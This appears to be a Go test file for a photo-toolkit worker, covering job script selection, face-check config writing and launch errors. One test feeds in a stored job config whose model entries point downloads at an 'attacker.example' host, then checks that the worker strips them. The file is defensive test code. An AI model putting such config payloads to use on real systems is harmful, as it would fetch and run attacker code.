package worker

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/geocine/aitoolkit/internal/paths"
	"github.com/geocine/aitoolkit/internal/photocheck"
	"github.com/geocine/aitoolkit/internal/photocheck/pyjob"
	"github.com/geocine/aitoolkit/internal/settings"
	"github.com/geocine/aitoolkit/internal/store"
)

// setupStore is setupRoot without Python and without run.py: these tests
// never launch a process.
func setupStore(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	dbPath := filepath.Join(root, "aitk_db.db")
	db, err := sql.Open("sqlite", store.FileURI(dbPath))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := db.Exec(ddl); err != nil {
		t.Fatal(err)
	}
	db.Close()
	oldRoot, oldDB, oldTrain := paths.ToolkitRoot, paths.DBPath, paths.DefaultTrainFolder
	paths.ToolkitRoot, paths.DBPath = root, dbPath
	paths.DefaultTrainFolder = filepath.Join(root, "output")
	settings.Flush()
	if err := store.Open(dbPath); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		store.DB.Close()
		paths.ToolkitRoot, paths.DBPath, paths.DefaultTrainFolder = oldRoot, oldDB, oldTrain
		settings.Flush()
	})
	return root
}

// faceJobConfig is a face check's job_config over two photos of dir.
func faceJobConfig(t *testing.T, dir, name string) string {
	t.Helper()
	files := []photocheck.FileRef{{File: "a.jpg", SHA256: strings.Repeat("a", 64)}, {File: "sub/b.png", SHA256: strings.Repeat("b", 64)}}
	raw, err := photocheck.BuildFaceJobConfig(dir, name, files, false, filepath.Join(t.TempDir(), "opencv_zoo"))
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

func TestScriptFor(t *testing.T) {
	root := t.TempDir()
	oldRoot := paths.ToolkitRoot
	paths.ToolkitRoot = root
	t.Cleanup(func() { paths.ToolkitRoot = oldRoot })

	training := t.TempDir()
	name := "jihan_faces_20261024_101500"
	folder := filepath.Join(training, name)
	cfg := filepath.Join(folder, ".job_config.json")
	faces := &store.Job{ID: "j1", Name: name, JobType: photocheck.FaceJobType}

	// a face check runs the embedded script, written into its job folder
	args, err := scriptFor(faces, folder, cfg)
	if err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(folder, pyjob.ScriptName)
	if len(args) != 2 || args[0] != script || args[1] != cfg {
		t.Fatalf("photo_faces args %q, want [%s %s]", args, script, cfg)
	}
	if got, err := os.ReadFile(script); err != nil || !bytes.Equal(got, pyjob.Script()) {
		t.Fatalf("script in the job folder differs from the embedded one (%v)", err)
	}
	// the supervisor recognises the process by the job name and the config
	if line := strings.Join(args, " "); !strings.Contains(line, name) || !strings.Contains(line, ".job_config.json") {
		t.Fatalf("command line %q lacks the job name or .job_config.json", line)
	}
	// it does not need run.py
	if _, err := os.Stat(filepath.Join(root, "run.py")); err == nil {
		t.Fatal("test root has a run.py")
	}

	// every other job runs run.py, and says so when it is missing
	for _, typ := range []string{"", "train", "caption", "inference"} {
		j := &store.Job{ID: "j2", Name: "run", JobType: typ}
		if _, err := scriptFor(j, filepath.Join(training, "run"), cfg); err == nil || err.Error() != "run.py not found" {
			t.Fatalf("%q without run.py: %v", typ, err)
		}
	}
	runPy := filepath.Join(root, "run.py")
	if err := os.WriteFile(runPy, []byte("pass\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, typ := range []string{"", "train", "caption", "inference"} {
		j := &store.Job{ID: "j2", Name: "run", JobType: typ}
		args, err := scriptFor(j, filepath.Join(training, "run"), cfg)
		if err != nil || len(args) != 2 || args[0] != runPy || args[1] != cfg {
			t.Fatalf("%q args %q, %v; want [%s %s]", typ, args, err, runPy, cfg)
		}
	}
	if _, err := os.Stat(filepath.Join(training, "run", pyjob.ScriptName)); err == nil {
		t.Fatal("a training job got the face script")
	}

	// a job folder that cannot be made is an error, not a panic
	blocked := filepath.Join(t.TempDir(), "file")
	os.WriteFile(blocked, nil, 0o644)
	if _, err := scriptFor(faces, blocked, cfg); err == nil {
		t.Fatal("a face check into a file path succeeded")
	}
}

// TestFaceJobConfig: the worker adds sqlite_db_path to a face check's
// config and keeps what photo_faces.py reads.
func TestFaceJobConfig(t *testing.T) {
	setupStore(t)
	dir := filepath.Join(t.TempDir(), "jihan")
	folder := filepath.Join(t.TempDir(), "jihan_faces_20261024_101500")
	os.MkdirAll(folder, 0o755)
	j := &store.Job{ID: "j1", Name: "jihan_faces_20261024_101500", JobType: photocheck.FaceJobType,
		JobConfig: faceJobConfig(t, dir, "jihan_faces_20261024_101500")}
	path := filepath.Join(folder, ".job_config.json")
	if err := writeJobConfig(context.Background(), j, folder, path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var cfg struct {
		Config struct {
			Name    string `json:"name"`
			Process []struct {
				Type         string               `json:"type"`
				SqliteDBPath string               `json:"sqlite_db_path"`
				DatasetDir   string               `json:"dataset_dir"`
				Files        []photocheck.FileRef `json:"files"`
				Out          string               `json:"out"`
				Models       map[string]any       `json:"models"`
				Engine       map[string]any       `json:"engine"`
			} `json:"process"`
		} `json:"config"`
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		t.Fatal(err)
	}
	p := cfg.Config.Process[0]
	if cfg.Config.Name != j.Name || p.Type != pyjob.ProcessType || p.SqliteDBPath != paths.DBPath || p.DatasetDir != dir ||
		len(p.Files) != 2 || p.Files[1].File != "sub/b.png" || p.Out != photocheck.FaceResultFile || p.Engine != nil {
		t.Fatalf("config %s", data)
	}
	if p.Models["dir"] == nil || p.Models["sface"] == nil {
		t.Fatalf("models %v", p.Models)
	}
}

// TestFaceJobConfigIgnoresStoredModels: a face check's stored config (an
// imported bundle, a POST /v1/jobs body) never chooses what photo_faces.py
// downloads or where it writes it; the worker puts back this server's pins
// and models folder.
func TestFaceJobConfigIgnoresStoredModels(t *testing.T) {
	setupStore(t)
	models := filepath.Join(t.TempDir(), "models")
	t.Setenv("MODELS_PATH", models)
	folder := filepath.Join(t.TempDir(), "evil")
	os.MkdirAll(folder, 0o755)
	stored := `{"job":"extension","config":{"name":"evil","process":[{"type":"aitk_photo_faces",` +
		`"files":[{"file":"a.jpg","sha256":"` + strings.Repeat("a", 64) + `"}],` +
		`"models":{"dir":".","yunet4":{"url":"https://attacker.example/run.py","sha256":"` + strings.Repeat("0", 64) + `"},` +
		`"extra":{"url":"https://attacker.example/x.py"}}}]}}`
	j := &store.Job{ID: "j1", Name: "evil", JobType: photocheck.FaceJobType, JobConfig: stored}
	path := filepath.Join(folder, ".job_config.json")
	if err := writeJobConfig(context.Background(), j, folder, path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var cfg struct {
		Config struct {
			Process []struct {
				Models map[string]json.RawMessage `json:"models"`
			} `json:"process"`
		} `json:"config"`
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		t.Fatal(err)
	}
	got := cfg.Config.Process[0].Models
	if len(got) != len(pyjob.Models)+1 {
		t.Fatalf("models keys %v, want the pins and dir", got)
	}
	var dir string
	if err := json.Unmarshal(got["dir"], &dir); err != nil || dir != photocheck.FaceModelsDir(models) {
		t.Fatalf("models dir %s, want %s", got["dir"], photocheck.FaceModelsDir(models))
	}
	for key, pin := range pyjob.Models {
		var m pyjob.Model
		if err := json.Unmarshal(got[key], &m); err != nil || m != pin {
			t.Fatalf("models.%s = %s, want the pin %+v", key, got[key], pin)
		}
	}
	if strings.Contains(string(data), "attacker") {
		t.Fatalf("stored urls survived: %s", data)
	}

	// a training job's config is left as stored
	tr := &store.Job{ID: "j2", Name: "run", JobType: "train", JobConfig: stored}
	if err := writeJobConfig(context.Background(), tr, folder, path); err != nil {
		t.Fatal(err)
	}
	if data, _ := os.ReadFile(path); !strings.Contains(string(data), "attacker") {
		t.Fatalf("a training config was changed: %s", data)
	}
}

// TestStartJobWithoutRunPy: a training job with no run.py fails with a
// clear message in its row and its log.
func TestStartJobWithoutRunPy(t *testing.T) {
	root := setupStore(t)
	ctx := context.Background()
	train := createJob(t, "trainer", "run", "0")
	startAndWatchJob(ctx, train)
	got, err := store.GetJob(ctx, train.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Status != "error" || got.Info != "Error launching job: run.py not found" {
		t.Fatalf("job %s: %q", got.Status, got.Info)
	}
	logText, _ := os.ReadFile(filepath.Join(root, "output", "trainer", "log.txt"))
	if !strings.Contains(string(logText), "run.py not found") {
		t.Fatalf("log.txt: %q", logText)
	}
}
